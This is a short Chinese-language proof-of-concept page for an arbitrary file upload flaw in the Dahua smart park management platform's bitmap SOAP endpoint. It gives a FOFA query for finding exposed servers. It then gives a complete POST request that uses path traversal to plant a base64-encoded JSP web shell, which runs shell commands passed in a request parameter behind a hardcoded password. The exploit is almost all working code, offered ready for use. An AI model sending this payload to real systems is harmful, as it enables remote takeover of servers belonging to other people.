## 大华智慧园区综合管理平台bitmap接口存在任意文件上传漏洞

大华园区综合管理平台/emap/webservice/gis/soap/bitmap接口处存在任意文件上传漏洞，恶意攻击者可能会上传后门文件，造成服务器失陷


## fofa
```
app="dahua-智慧园区综合管理平台"
```
![33323d220d4e626f9db80f3dac6829f6](https://github.com/wy876/POC/assets/139549762/d2b1222c-c509-474d-9c28-92b05ade76c1)


## poc
```
POST /emap/webservice/gis/soap/bitmap HTTP/1.1
Host: your-ip
Content-Type: text/xml; charset=utf-8
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
    <soapenv:Header/>           
	    <soapenv:Body>
     		    <res:uploadPicFile>
                    <arg0>
             	    <picPath>/../rce.jsp</picPath>
                    </arg0>
                    <arg1>PCUgaWYoIjEyMyIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwd2QiKSkpeyBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7IGludCBhID0gLTE7IGJ5dGVbXSBiID0gbmV3IGJ5dGVbMjA0OF07IG91dC5wcmludCgiPHByZT4iKTsgd2hpbGUoKGE9aW4ucmVhZChiKSkhPS0xKXsgb3V0LnByaW50bG4obmV3IFN0cmluZyhiKSk7IH0gb3V0LnByaW50KCI8L3ByZT4iKTsgfSAlPg==</arg1>
                </res:uploadPicFile>
		</soapenv:Body>
</soapenv:Envelope>
```
文件上传路径：http://127.0.0.1/upload/rce.jsp


![image](https://github.com/wy876/POC/assets/139549762/f83ff567-1c39-4b96-8985-90c0f06542b3)
